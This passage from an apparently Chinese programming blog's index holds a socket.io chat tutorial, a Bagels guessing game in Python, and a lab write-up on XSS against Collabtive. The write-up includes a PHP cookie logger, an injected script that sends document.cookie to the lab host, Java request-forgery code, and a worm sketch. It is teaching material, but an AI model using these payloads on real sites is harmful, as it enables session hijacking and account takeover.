class="built_in">rgb</span>(130, 224, 255); <span class="attribute">border</span>: none; <span class="attribute">padding</span>: <span class="number">10px</span>; }</span></span><br><span class="line"><span class="css">      <span class="selector-id">#messages</span> { <span class="attribute">list-style-type</span>: none; <span class="attribute">margin</span>: <span class="number">0</span>; <span class="attribute">padding</span>: <span class="number">0</span>; }</span></span><br><span class="line"><span class="css">      <span class="selector-id">#messages</span> <span class="selector-tag">li</span> { <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">10px</span>; }</span></span><br><span class="line"><span class="css">      <span class="selector-id">#messages</span> <span class="selector-tag">li</span><span class="selector-pseudo">:nth-child(odd)</span> { <span class="attribute">background</span>: <span class="number">#eee</span>; }</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;messages&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;m&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>Send<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/socket.io/socket.io.js&quot;</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-1.11.1.js&quot;</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">var</span> socket = io();</span></span><br><span class="line"><span class="javascript">      $(<span class="string">&apos;form&apos;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span></span><br><span class="line"><span class="javascript">        socket.emit(<span class="string">&apos;chat message&apos;</span>, $(<span class="string">&apos;#m&apos;</span>).val());</span></span><br><span class="line"><span class="javascript">$(<span class="string">&apos;#m&apos;</span>).val(<span class="string">&apos;&apos;</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">      });</span></span><br><span class="line"><span class="actionscript">      socket.on(<span class="string">&apos;chat message&apos;</span>, <span class="function"><span class="keyword">function</span><span class="params">(msg)</span></span>{</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&apos;#messages&apos;</span>).append($(<span class="string">&apos;&lt;li&gt;&apos;</span>).text(msg));</span></span><br><span class="line"><span class="undefined">      });</span></span><br><span class="line"><span class="undefined">        });</span></span><br><span class="line"><span class="undefined">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>index.js<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">&apos;express&apos;</span>)();</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&apos;http&apos;</span>).Server(app);</span><br><span class="line"><span class="keyword">var</span> io = <span class="built_in">require</span>(<span class="string">&apos;socket.io&apos;</span>)(http);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&apos;/&apos;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>{</span><br><span class="line">res.sendFile(__dirname + <span class="string">&apos;/index.html&apos;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">io.on(<span class="string">&apos;connection&apos;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">socket</span>)</span>{</span><br><span class="line">socket.broadcast.emit(<span class="string">&apos;hi&apos;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&apos;a user connected&apos;</span>);</span><br><span class="line">socket.on(<span class="string">&apos;disconnect&apos;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&apos;user disconnected&apos;</span>);</span><br><span class="line">});</span><br><span class="line">socket.on(<span class="string">&apos;chat message&apos;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>{</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&apos;message: &apos;</span> + msg);</span><br><span class="line">    io.emit(<span class="string">&apos;chat message&apos;</span>, msg);</span><br><span class="line">});</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">io.emit(<span class="string">&apos;some event&apos;</span>, {<span class="attr">for</span>: <span class="string">&apos;everyone&apos;</span>});</span><br><span class="line"></span><br><span class="line">http.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&apos;listening on 127.0.0.1:3000&apos;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>package.json<br></p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;socket-chat-example&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;my first socket.io app&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: {}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BB0;&#x5F97;&#x5B89;&#x88C5;&#x8FD9;&#x4E24;&#x4E2A;&#x6A21;&#x5757;&#xFF1A;</p><p>npm install &#x2013;save <a href="mailto:express@4.15.2" target="_blank" rel="noopener">express@4.15.2</a></p><p>npm install &#x2013;save socket.io</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Collabtive and XSS </title>
      <link href="/2018/10/04/XSS/"/>
      <url>/2018/10/04/XSS/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1525937878177.png" alt=""></p><a id="more"></a><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line"></span><br><span class="line">sudo vim /etc/apache2/conf.d/lab.conf</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *&gt;</span><br><span class="line">ServerName http:<span class="comment">//www.xsslabcollabtive.com</span></span><br><span class="line">DocumentRoot /<span class="keyword">var</span>/www/XSS/Collabtive/</span><br><span class="line">&lt;<span class="regexp">/VirtualHost&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">sudo service apache2 start</span></span><br><span class="line"><span class="regexp">sudo mysqld_safe</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">cd /</span><span class="keyword">var</span>/www/XSS/Collabtive/</span><br><span class="line">sudo vim js.html</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">alert(<span class="string">&apos;xss&apos;</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">sudo vim myscript.js</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">alert(&apos;xss&apos;);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">sudo vim include.html</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script type=&quot;text/</span>javascript<span class="string">&quot; src=&quot;</span>http:<span class="comment">//www.xsslabcollabtive.com/myscript.js&quot;&gt;</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">sudo vim /</span><span class="keyword">var</span>/www/XSS/Collabtive/manageuser.php</span><br><span class="line"></span><br><span class="line">sudo vim hack.php</span><br><span class="line"></span><br><span class="line">sudo vim hack.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[<span class="string">&apos;c&apos;</span>];</span><br><span class="line">$log = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite($log,$cookie .<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($log);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">shiyanlou@<span class="number">5</span>a2e74121d80:<span class="regexp">/var/</span>www/XSS/Collabtive$ touch cookie.txt</span><br><span class="line">shiyanlou@<span class="number">5</span>a2e74121d80:<span class="regexp">/var/</span>www/XSS/Collabtive$ sudo chmod <span class="number">777</span> cookie.txt</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;&lt;script&gt;document.write(&apos;&lt;img src=http://www.xsslabcollabtive.com/hack.php?c=&apos; + escape(document.cookie) + &apos;&gt;&apos;);&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#x53D7;&#x5BB3;&#x8005;&#x8BBF;&#x95EE; www.xsslabcollabtive.com/manageuser.php &#x9875;&#x9762;&#xFF1A;</span><br><span class="line"></span><br><span class="line">cd /home/shiyanlou</span><br><span class="line">wget http:<span class="comment">//labfile.oss.aliyuncs.com/courses/304/live_http_headers.xpi</span></span><br><span class="line"></span><br><span class="line">install Live HTTP headers tool <span class="keyword">in</span> firefox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">HTTPSimpleForge</span> </span>{</span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span>[] args) throws IOException {</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">int responseCode;</span><br><span class="line">InputStream responseIn=<span class="literal">null</span>;</span><br><span class="line"><span class="comment">// URL to be forged.</span></span><br><span class="line">URL url = <span class="keyword">new</span> URL (<span class="string">&quot;http://www.xsslabcollabtive.com/admin.php?action=addpro&quot;</span>);</span><br><span class="line"><span class="comment">// URLConnection instance is created to further parameterize a</span></span><br><span class="line"><span class="comment">// resource request past what the state members of URL instance</span></span><br><span class="line"><span class="comment">// can represent.</span></span><br><span class="line">URLConnection urlConn = url.openConnection();</span><br><span class="line"><span class="keyword">if</span> (urlConn <span class="keyword">instanceof</span> HttpURLConnection) {</span><br><span class="line">urlConn.setConnectTimeout(<span class="number">60000</span>);</span><br><span class="line">urlConn.setReadTimeout(<span class="number">90000</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">// addRequestProperty method is used to add HTTP Header Information.</span></span><br><span class="line"><span class="comment">// Here we add User-Agent HTTP header to the forged HTTP packet.</span></span><br><span class="line"><span class="comment">// Add other necessary HTTP Headers yourself. Cookies should be stolen</span></span><br><span class="line"><span class="comment">// using the method in task3.</span></span><br><span class="line">urlConn.addRequestProperty(<span class="string">&quot;User-agent&quot;</span>,<span class="string">&quot;Sun JDK 1.6&quot;</span>);</span><br><span class="line"><span class="comment">//HTTP Post Data which includes the information to be sent to the server.</span></span><br><span class="line"><span class="built_in">String</span> data=<span class="string">&quot;name=test&amp;desc=test...&amp;assignto[]=...&amp;assignme=1&quot;</span>;</span><br><span class="line"><span class="comment">// DoOutput flag of URL Connection should be set to true</span></span><br><span class="line"><span class="comment">// to send HTTP POST message.</span></span><br><span class="line">urlConn.setDoOutput(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// OutputStreamWriter is used to write the HTTP POST data</span></span><br><span class="line"><span class="comment">// to the url connection.</span></span><br><span class="line">OutputStreamWriter wr = <span class="keyword">new</span> OutputStreamWriter(urlConn.getOutputStream());</span><br><span class="line">wr.write(data);</span><br><span class="line">wr.flush();</span><br><span class="line"><span class="comment">// HttpURLConnection a subclass of URLConnection is returned by</span></span><br><span class="line"><span class="comment">// url.openConnection() since the url is an http request.</span></span><br><span class="line"><span class="keyword">if</span> (urlConn <span class="keyword">instanceof</span> HttpURLConnection) {</span><br><span class="line">HttpURLConnection httpConn = (HttpURLConnection) urlConn;</span><br><span class="line"><span class="comment">// Contacts the web server and gets the status code from</span></span><br><span class="line"><span class="comment">// HTTP Response message.</span></span><br><span class="line">responseCode = httpConn.getResponseCode();</span><br><span class="line">System.out.println(<span class="string">&quot;Response Code = &quot;</span> + responseCode);</span><br><span class="line"><span class="comment">// HTTP status code HTTP_OK means the response was</span></span><br><span class="line"><span class="comment">// received sucessfully.</span></span><br><span class="line"><span class="keyword">if</span> (responseCode == HttpURLConnection.HTTP_OK) {</span><br><span class="line"><span class="comment">//Laboratory for Computer Security Education 6</span></span><br><span class="line"><span class="comment">// Get the input stream from url connection object.</span></span><br><span class="line">responseIn = urlConn.getInputStream();</span><br><span class="line"><span class="comment">// Create an instance for BufferedReader</span></span><br><span class="line"><span class="comment">// to read the response line by line.</span></span><br><span class="line">BufferedReader buf_inp = <span class="keyword">new</span> BufferedReader(</span><br><span class="line"><span class="keyword">new</span> InputStreamReader(responseIn));</span><br><span class="line"><span class="built_in">String</span> inputLine;</span><br><span class="line"><span class="keyword">while</span>((inputLine = buf_inp.readLine())!=<span class="literal">null</span>) {</span><br><span class="line">System.out.println(inputLine);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">} <span class="keyword">catch</span> (MalformedURLException e) {</span><br><span class="line">e.printStackTrace();</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">--------------------</span><br><span class="line"></span><br><span class="line">XSS&#x8815;&#x866B;</span><br><span class="line"></span><br><span class="line">sudo vim test.js</span><br><span class="line"></span><br><span class="line">sudo vim test1.js</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> on=<span class="keyword">new</span> Ajax.PeriodicalUpdater(<span class="string">&quot;onlinelist&quot;</span>,</span><br><span class="line"><span class="string">&quot;manageuser.php?action=onlinelist&quot;</span>,</span><br><span class="line"><span class="comment">//&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x65B0;&#x7684;Ajax.PeriodicalUpdater</span></span><br><span class="line">{<span class="attr">method</span>:<span class="string">&apos;get&apos;</span>,<span class="attr">onSuccess</span>:<span class="function"><span class="keyword">function</span>(<span class="params">transport</span>)</span>{alert(transport.responseText);},</span><br><span class="line">frequence:<span class="number">1000</span>}</span><br><span class="line"><span class="comment">//&#x8BF7;&#x6C42;&#x65B9;&#x5F0F;&#x4E3A;get&#xFF0C;&#x9891;&#x7387;&#x4E3A;1000</span></span><br><span class="line"></span><br><span class="line">&#x81EA;&#x52A8;&#x4F20;&#x64AD;&#x7684;&#x8815;&#x866B;&#xFF1A;</span><br><span class="line">sudo vim xss_worm.js</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> strCode = <span class="built_in">document</span>.getElementById(<span class="string">&quot;worm&quot;</span>);</span><br><span class="line">alert(strCode.innerHTML);</span><br><span class="line"></span><br><span class="line">&#x8C03;&#x7528;&#x8815;&#x866B;&#xFF1A;</span><br><span class="line">sudo vim worm.html</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&apos;text/javascript&apos;</span> src=<span class="string">&apos;http://www.xsslabcollabtive.com/xss_worm.js&apos;</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">XSS&#x9632;&#x5FA1;</span><br><span class="line"></span><br><span class="line">sudo vim /<span class="keyword">var</span>/www/XSS/Collabtive/include/initfunctions.php</span><br></pre></td></tr></tbody></table></figure><p>&#x6211;&#x8FD9;&#x91CC;&#x53EA;&#x8BB0;&#x5F55;&#x7684;&#x6574;&#x4E2A;&#x5B9E;&#x9A8C;&#x7684;&#x5927;&#x81F4;&#x8FC7;&#x7A0B;&#xFF0C;&#x8981;&#x60F3;&#x8981;&#x4E86;&#x89E3;&#x66F4;&#x591A;&#xFF0C;&#x8BF7;&#x5230;&#x5B9E;&#x9A8C;&#x697C;&#x5B98;&#x7F51;&#x5B66;&#x4E60;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> secrity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bagels</title>
      <link href="/2018/10/03/Bagels/"/>
      <url>/2018/10/03/Bagels/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1520819684116.png" alt=""></p><a id="more"></a><p>python code:<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">NUM_DIGITS = <span class="number">3</span></span><br><span class="line">MAX_GUESS = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSecretNum</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7531; NUM_DIGITS &#x4E2A;&#x4E0D;&#x91CD;&#x590D;&#x968F;&#x673A;&#x6570;&#x7EC4;&#x6210;&#x7684;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">    numbers = list(range(<span class="number">10</span>))</span><br><span class="line">    random.shuffle(numbers)</span><br><span class="line">    secretNum = <span class="string">&apos;&apos;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(NUM_DIGITS):</span><br><span class="line">        secretNum += str(numbers[i])</span><br><span class="line">    <span class="keyword">return</span> secretNum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getClues</span><span class="params">(guess, secretNum)</span>:</span></span><br><span class="line">    <span class="comment"># &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7531; Pico, Fermi &#x548C; Bagels &#x7EC4;&#x6210;&#x7684;&#xFF0C;&#x7528;&#x6765;&#x63D0;&#x793A;&#x7528;&#x6237;&#x7684;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">    <span class="keyword">if</span> guess == secretNum:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&apos;You got it!&apos;</span></span><br><span class="line">    clues = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(guess)):</span><br><span class="line">        <span class="keyword">if</span> guess[i] == secretNum[i]:</span><br><span class="line">            clues.append(<span class="string">&apos;Fermi&apos;</span>)</span><br><span class="line">        <span class="keyword">elif</span> guess[i] <span class="keyword">in</span> secretNum:</span><br><span class="line">            clues.append(<span class="string">&apos;Pico&apos;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(clues) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&apos;Bagels&apos;</span></span><br><span class="line">    clues.sort()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&apos; &apos;</span>.join(clues)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isOnlyDigits</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="comment"># &#x5982;&#x679C;&#x5B57;&#x7B26;&#x4E32;&#x53EA;&#x5305;&#x542B;&#x6570;&#x5B57;&#xFF0C;&#x8FD4;&#x56DE;&#x771F;&#x3002;&#x5426;&#x5219;&#x8FD4;&#x56DE;&#x5047;</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="string">&apos;&apos;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&apos;0 1 2 3 4 5 6 7 8 9&apos;</span>.split():</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">&apos;I am thinking of a %s-digit number. Try to guess what it is.&apos;</span> % (NUM_DIGITS))</span><br><span class="line">print(<span class="string">&apos;The clues I give are...&apos;</span>)</span><br><span class="line">print(<span class="string">&apos;When I say:    That means:&apos;</span>)</span><br><span class="line">print(<span class="string">&apos;  Bagels       None of the digits is correct.&apos;</span>)</span><br><span class="line">print(<span class="string">&apos;  Pico         One digit is correct but in the wrong position.&apos;</span>)</span><br><span class="line">print(<span class="string">&apos;  Fermi        One digit is correct and in the right position.&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    secretNum = getSecretNum()</span><br><span class="line">    print(<span class="string">&apos;I have thought up a number. You have %s guesses to get it.&apos;</span> % (MAX_GUESS))</span><br><span class="line">    guessesTaken = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> guessesTaken &lt;= MAX_GUESS:</span><br><span class="line">        guess = <span class="string">&apos;&apos;</span></span><br><span class="line">        <span class="keyword">while</span> len(guess) != NUM_DIGITS <span class="keyword">or</span> <span class="keyword">not</span> isOnlyDigits(guess):</span><br><span class="line">            print(<span class="string">&apos;Guess #%s: &apos;</span> % (guessesTaken))</span><br><span class="line">            guess = input()</span><br><span class="line">        print(getClues(guess, secretNum))</span><br><span class="line">        guessesTaken += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> guess == secretNum:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> guessesTaken &gt; MAX_GUESS:</span><br><span class="line">            print(<span class="string">&apos;You ran out of guesses. The answer was %s.&apos;</span> % (secretNum))</span><br><span class="line">    print(<span class="string">&apos;Do you want to play again? (yes or no)&apos;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> input().lower().startswith(<span class="string">&apos;y&apos;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x81EA;&#x5DF1;&#x53C8;&#x52A8;&#x624B;&#x5199;&#x4E86;&#x4E00;&#x4E2A;C++&#x7248;&#x7684;</p><p>c++ code:<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 